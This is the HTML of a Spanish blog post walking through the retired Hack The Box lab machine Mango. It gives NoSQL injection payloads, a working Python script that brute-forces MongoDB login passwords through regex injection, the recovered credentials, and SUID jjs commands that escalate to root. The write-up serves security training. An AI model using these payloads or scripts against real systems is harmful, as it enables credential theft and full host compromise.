@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Retirada Mango de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Retirada Mango de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MANGO" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MANGO" />
+<link rel="canonical" href="http://localhost:4000/2021/06/28/Mango-NoSQLI.html" />
+<meta property="og:url" content="http://localhost:4000/2021/06/28/Mango-NoSQLI.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-06-28T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Retirada Mango de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2021-06-28T00:00:00-03:00","datePublished":"2021-06-28T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MANGO","headline":"Maquina Retirada Mango de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2021/06/28/Mango-NoSQLI.html"},"url":"http://localhost:4000/2021/06/28/Mango-NoSQLI.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina Retirada Mango de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/Bypass,/">Bypass,</a>
+      
+      <a class="tag" href="/tag/NoSQLI,/">NoSQLI,</a>
+      
+      <a class="tag" href="/tag/Mongo-db,/">Mongo-db,</a>
+      
+      <a class="tag" href="/tag/JJS,/">JJS,</a>
+      
+      <a class="tag" href="/tag/Web/">Web</a>
+      
+      <a class="tag" href="/tag/Hacking,/">Hacking,</a>
+      
+      <a class="tag" href="/tag/Maquinas/">Maquinas</a>
+      
+      <a class="tag" href="/tag/Retiradas,/">Retiradas,</a>
+      
+      <a class="tag" href="/tag/Writeup/">Writeup</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 28 Jun 2021</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada MANGO</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="mango--hack-the-box">Mango ~ Hack The Box</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 4000 -vvv -n -Pn -oG allports 10.10.10.162       "</span>
+</code></pre></div></div>
+<p>Procedemos con el siguiente escaneo de Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.29
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: 403 Forbidden
+443/tcp open  ssl/http Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>staging-order.mango.htb/organizationName<span class="o">=</span>Mango Prv Ltd./stateOrProvinceName<span class="o">=</span>None/countryName<span class="o">=</span>IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| tls-alpn: 
+|_  http/1.1
+Service Info: Host: 10.10.10.162<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Vemos un dominio</p>
+
+<p>Usamos la herramienta whatweb</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># whatweb 10.10.10.162                                                                                                                                                                                        1 ⚙</span>
+http://10.10.10.162 <span class="o">[</span>403 Forbidden] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.162], Title[403 Forbidden]
+</code></pre></div></div>
+<p>Nos arroja un Forbidden y si probamos con el dominio encontrado?</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># whatweb staging-order.mango.htb                                                                                                                                                                             </span>
+http://staging-order.mango.htb/ <span class="o">[</span>200 OK] Apache[2.4.29], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.162], PasswordField[password], Script, Title[Mango | Sweet &amp; Juicy]
+</code></pre></div></div>
+<p>Nos arroja mas informacion.</p>
+
+<p>Vemos que Tenemos un Login, probamos las tipicas injecciones de SQLI y vemos que no nos respode a ninguna.. 
+Buscamos informacion sobre las bases de datos <code class="language-plaintext highlighter-rouge">Mongo-db</code>
+Vemos que justo para las bases de datos <code class="language-plaintext highlighter-rouge">Mongo-db</code> hay unas injecciones llamadas <code class="language-plaintext highlighter-rouge">NoSqli</code>.</p>
+
+<p>Injeccion No Sqli</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username[<span class="nv">$regex</span><span class="o">]=</span>^a.<span class="k">*</span><span class="nv">$&amp;</span>password[<span class="nv">$ne</span><span class="o">]=</span>lol&amp;login<span class="o">=</span>login    <span class="nt">---</span> codigo 302
+</code></pre></div></div>
+<p>Averiguamos la longitud de la contraseña para el usuario <code class="language-plaintext highlighter-rouge">admin</code>: <code class="language-plaintext highlighter-rouge">username=admin&amp;password[$regex]=^.{12}$&amp;login=login   ----302</code></p>
+
+<p>Averiguarmos la longitud de la contraseña para el usuario <code class="language-plaintext highlighter-rouge">mango</code>: <code class="language-plaintext highlighter-rouge">pusername=mango&amp;password[$regex]=^.{16}$&amp;login=login ------- 302</code></p>
+
+<p>Conseguimos sacar dos usuarios validos: <code class="language-plaintext highlighter-rouge">admin , mango</code></p>
+
+<p>Nos montamos un <code class="language-plaintext highlighter-rouge">exploit</code> en python3 para sacar las contraseñas de los dos usuarios enumerados de la misma forma.</p>
+<pre><code class="language-python3">#!/usr/bin/python3
+
+import requests
+import re
+import signal
+import sys
+import pdb
+import string
+import time
+
+from pwn import *
+
+def def_handler(sig, frame):
+    print("\n[!] Saliendo...\n")
+    sys.exit(1)
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+main_url = "http://staging-order.mango.htb"
+s = string.ascii_letters + string.digits + string.punctuation 
+
+def makeRequest():
+
+    password = ""
+
+    for i in range(0, 20):
+
+        for character in s:
+
+            p1.status("Probando el caracter %s" % character)
+
+            post_data = {
+                'username': 'admin',
+                'password[$regex]': '^%s.*$' % (re.escape(password + character)),
+                'login': 'login'
+            }
+
+            r = requests.post(main_url, data=post_data, allow_redirects=False)
+
+            if r.status_code == 302:
+                password += character
+                p2.status(password)
+                break
+
+if __name__ == '__main__':
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    p2 = log.progress("Password")
+    time.sleep(2)
+
+    makeRequest()
+</code></pre>
+<p>Lanzamos este exploit para sacar las passwords
+Para el user <code class="language-plaintext highlighter-rouge">mango</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 Mango_NoSQLI.py                                                                                                                                                                                     </span>
+<span class="o">[</span>↙] Fuerza bruta: Probando el caracter ~
+<span class="o">[</span>◒] Password: h3mXK8RhU~f<span class="o">{]</span>f5H
+</code></pre></div></div>
+<p>Para el user <code class="language-plaintext highlighter-rouge">admin</code>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># python3 Mango_NoSQLI.py                                                                                                                                                       </span>
+
+<span class="o">[</span>..<span class="se">\.</span>....] Fuerza bruta: Probando el caracter ~
+<span class="o">[</span>◥] Password: t9KcS3&gt;!0B#2
+</code></pre></div></div>
+
+<h1 id="accediendo-por-el-ssh-con-las-credenciales-obtenidas">Accediendo por el SSH con las Credenciales Obtenidas</h1>
+<p>Teniendo las credenciales de la base de datos podriamos probar a conectarnos por el servicio <code class="language-plaintext highlighter-rouge">ssh</code> con las <code class="language-plaintext highlighter-rouge">passwords</code> encontradas.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mango@mango:~<span class="nv">$ </span><span class="nb">whoami
+</span>mango
+
+mango@mango:/home<span class="nv">$ </span><span class="nb">ls
+</span>admin  mango
+
+mango@mango:/home/admin<span class="nv">$ </span><span class="nb">ls
+</span>user.txt
+
+</code></pre></div></div>
+<p>ernumeramos el sistema:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mango@mango:/<span class="nv">$ </span>find / <span class="nt">-group</span> admin <span class="nt">-type</span> f 2&gt;/dev/null
+/var/crash/_usr_bin_pkttyagent.4000000000.crash
+/home/admin/.bash_logout
+/home/admin/.profile
+/home/admin/.bashrc
+/home/admin/user.txt
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+<span class="nt">-rwsr-sr--</span> 1 root  admin  10352 Jul 18  2019 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+</code></pre></div></div>
+<p>Como nosotros teniamos la password encontrada del usuario <code class="language-plaintext highlighter-rouge">Admin</code> podemos probar a hacer un cambio de usuario con el comando <code class="language-plaintext highlighter-rouge">su</code>.
+Vemos que lo hacemos sin problema y conseguimos la flag de <code class="language-plaintext highlighter-rouge">user.txt</code>.</p>
+
+<h1 id="escalada-de-privilegios-mediante-el-binario-suid-jjs">Escalada de privilegios mediante el Binario SUID jjs</h1>
+<p>Con el binario SUID encontrado de jjs nos dirigimos como siempre a la pagina de GTFOBins y chequeamos por <code class="language-plaintext highlighter-rouge">jjs</code> y permisos SUID:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"Java.type('java.lang.Runtime').getRuntime().exec('/bin/sh -pc </span><span class="se">\$</span><span class="s2">@|sh</span><span class="se">\$</span><span class="s2">{IFS}-p _ echo sh -p &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">').waitFor()"</span> | ./jjs <span class="sb">``</span>
+</code></pre></div></div>
+<p>Para Hacerlo de una manera mas sencilla, nos abrimos una session interactiva y modificamos un poco el comando a introducir:</p>
+<ul>
+  <li>La Modificamos ya que estamos en una session interactiva de jjs -
+```bash
+$ Java.type(‘java.lang.Runtime’).getRuntime().exec(‘chmod u+s /bin/bash’).waitFor()</li>
+</ul>
+
+<p>$ Java.type(‘java.lang.Runtime’).getRuntime().exec(‘chmod u+s /bin/bash’).waitFor()
+```
+Introducimos la sentencia en <code class="language-plaintext highlighter-rouge">java</code> y conseguimos <code class="language-plaintext highlighter-rouge">root</code>
+Maquina Rooteada =) KOHack</p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2021/06/28/Mango-NoSQLI.html';
+     this.page.identifier = '/2021/06/28/Mango-NoSQLI';
+     this.page.title = 'Maquina Retirada Mango de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2022/06/27/Trick.html">
+            Maquina  Retirada Trick de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/15/Attacktive-Directory.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/%2C/" class="set-1">,</a> <a href="/tag/1.8%2C/" class="set-1">1.8,</a> <a href="/tag/4.4%2C/" class="set-1">4.4,</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/adrotate%2C/" class="set-1">ADRotate,</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/autopwn%2C/" class="set-1">AutoPwn,</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bof%2C/" class="set-1">BOF,</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/blind%2C/" class="set-1">Blind,</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/bruteforce%2C/" class="set-1">Bruteforce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/curl%2C/" class="set-1">CURL,</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/command/" class="set-1">Command</a> <a href="/tag/contracts%2C/" class="set-1">Contracts,</a> <a href="/tag/cracking/" class="set-1">Cracking</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/crontabs%2C/" class="set-1">CronTabs,</a> <a href="/tag/crypto%2C/" class="set-1">Crypto,</a> <a href="/tag/curlftp%2C/" class="set-1">CurlFtp,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dockers%2C/" class="set-1">Dockers,</a> <a href="/tag/domain/" class="set-1">Domain</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/ethereum%2C/" class="set-1">Ethereum,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/execel/" class="set-1">Execel</a> <a href="/tag/exploit%2C/" class="set-1">Exploit,</a> <a href="/tag/fail2ban%2C/" class="set-1">Fail2ban,</a> <a href="/tag/file/" class="set-1">File</a> <a href="/tag/file%2C/" class="set-1">File,</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/ftp%2C/" class="set-1">Ftp,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing/" class="set-1">Fuzzing</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gitlab%2C/" class="set-1">GitLab,</a> <a href="/tag/gitbucket%2C/" class="set-1">Gitbucket,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hackthebox%2C/" class="set-1">HackTheBox,</a> <a href="/tag/hacking/" class="set-3">Hacking</a> <a href="/tag/hacking%2C/" class="set-2">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hijacking%2C/" class="set-1">Hijacking,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/ipfs%2C/" class="set-1">IPFS,</a> <a href="/tag/ipv6%2C/" class="set-1">IPV6,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/id-rsa%2C/" class="set-1">Id-Rsa,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/inclusion%2C/" class="set-1">Inclusion,</a> <a href="/tag/injection%29%2C/" class="set-1">Injection),</a> <a href="/tag/injection%2C/" class="set-1">Injection,</a> <a href="/tag/jjs%2C/" class="set-1">JJS,</a> <a href="/tag/jndi%2C/" class="set-1">JNDI,</a> <a href="/tag/joomla%2C/" class="set-1">Joomla,</a> <a href="/tag/journalctl%2C/" class="set-1">Journalctl,</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/kernel/" class="set-1">Kernel</a> <a href="/tag/knocking%2C/" class="set-1">Knocking,</a> <a href="/tag/kubernetes%2C/" class="set-1">Kubernetes,</a> <a href="/tag/ldap/" class="set-1">LDAP</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/local/" class="set-1">Local</a> <a href="/tag/log4j%2C/" class="set-1">Log4j,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/malicius/" class="set-1">Malicius</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mattermost%2C/" class="set-1">Mattermost,</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/misconfigurations%2C/" class="set-1">Misconfigurations,</a> <a href="/tag/mongo-db%2C/" class="set-1">Mongo-db,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mr.robot%2C/" class="set-1">Mr.Robot,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/nosqli%2C/" class="set-1">NoSQLI,</a> <a href="/tag/node-red%2C/" class="set-1">Node-Red,</a> <a href="/tag/nostromo/" class="set-1">Nostromo</a> <a href="/tag/os/" class="set-1">OS</a> <a href="/tag/oscp/" class="set-3">OSCP</a> <a href="/tag/osticket%2C/" class="set-1">OSTicket,</a> <a href="/tag/offensive/" class="set-1">Offensive</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path/" class="set-1">Path</a> <a href="/tag/path%2C/" class="set-3">Path,</a> <a href="/tag/pivoting%2C/" class="set-1">Pivoting,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/pods%2Fcontainer./" class="set-1">Pods/Container.</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/port/" class="set-1">Port</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portainer%2C/" class="set-1">Portainer,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/protection%2C/" class="set-1">Protection,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/python3%2C/" class="set-1">Python3,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/read%2C/" class="set-1">Read,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/revome/" class="set-1">Revome</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/snmp%2C/" class="set-1">SNMP,</a> <a href="/tag/sqli/" class="set-1">SQLI</a> <a href="/tag/sqli%2C/" class="set-1">SQLI,</a> <a href="/tag/sqlinjecction%2C/" class="set-1">SQLInjecction,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/ssti%28server/" class="set-1">SSTI(Server</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/script%2C/" class="set-1">Script,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/security%2C/" class="set-1">Security,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/side/" class="set-1">Side</a> <a href="/tag/smart/" class="set-1">Smart</a> <a href="/tag/smb%2C/" class="set-1">Smb,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/subdomains%2C/" class="set-1">Subdomains,</a> <a href="/tag/sudo/" class="set-1">Sudo</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/template/" class="set-1">Template</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/tomcat%2C/" class="set-1">Tomcat,</a> <a href="/tag/transfer%2C/" class="set-1">Transfer,</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/tryhackme%2C/" class="set-1">TryHackMe,</a> <a href="/tag/ubuntu/" class="set-1">Ubuntu</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-2">Web</a> <a href="/tag/web3%2C/" class="set-1">Web3,</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-2">Writeup</a> <a href="/tag/writeup%2C/" class="set-3">Writeup,</a> <a href="/tag/x-forwarder-for%2C/" class="set-1">X-Forwarder-For,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/ysoserial%2C/" class="set-1">Ysoserial,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/zone/" class="set-1">Zone</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/bashscript%2C/" class="set-1">bashscript,</a> <a href="/tag/chisel%2C/" class="set-1">chisel,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/dompdf%2C/" class="set-1">dompdf,</a> <a href="/tag/ecppt%2C/" class="set-1">eCPPT,</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/msfvenom%2C/" class="set-1">msfvenom,</a> <a href="/tag/nmap%2C/" class="set-1">nmap,</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a 